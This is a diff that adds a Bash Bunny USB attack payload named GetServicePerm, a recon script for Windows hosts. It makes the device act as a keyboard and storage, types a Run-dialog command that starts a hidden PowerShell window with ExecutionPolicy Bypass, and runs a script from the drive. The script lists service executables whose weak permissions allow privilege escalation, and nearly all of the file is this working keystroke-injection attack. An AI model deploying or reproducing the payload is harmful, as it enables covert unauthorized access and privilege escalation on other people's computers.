@@ -1,0 +1,33 @@
+#!/bin/bash
+#
+# Title:         GetServicePerm
+# Author:        Resheph @ www.postexplo.com
+# Version:       0.1
+# Target:        Microsoft Windows hosts supporting PowerShell
+# Category:      Recon
+#
+# Description:
+# When executed on a Windows host the payload gathers a list of permissions on executables used as a service.
+# This is useful when a service is executed with elevated privileges but is modifiable by everyone.
+# When this senario exists a normal user can modify or replace that executable with anything useful and have it run with elevated privileges.
+# 
+
+# init
+ATTACKMODE HID STORAGE
+
+GET SWITCH_POSITION
+
+LOOTDIR=/root/udisk/loot/GetServicePerm
+mkdir -p $LOOTDIR
+
+# Do Recon
+LED SETUP
+Q DELAY 6000
+Q GUI r
+Q DELAY 100
+Q STRING powerShell -windowstyle hidden -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\GetServicePerm.ps1')"
+Q ENTER
+
+# Done
+sync;sleep 1;sync
+LED FINISH
